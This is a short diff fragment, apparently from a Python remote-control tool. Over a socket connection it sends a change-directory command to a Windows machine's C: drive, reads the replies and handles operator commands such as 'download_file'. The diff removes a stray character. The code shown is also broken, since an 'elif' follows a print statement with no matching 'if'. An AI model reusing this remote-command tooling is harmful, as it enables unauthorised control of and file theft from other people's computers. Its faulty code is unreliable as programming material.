@@ -59,7 +59,7 @@ def commands(conn):
     conn.send("cd C:\\".encode("utf-8"))
     y = conn.recv(6000).decode("utf-8")
     while True: 
-        print(y,end ="")>
+        print(y,end ="")
         elif len(cmd) > 0:
             if cmd == "download_file":
                 conn.send(cmd.encode("utf-8"))
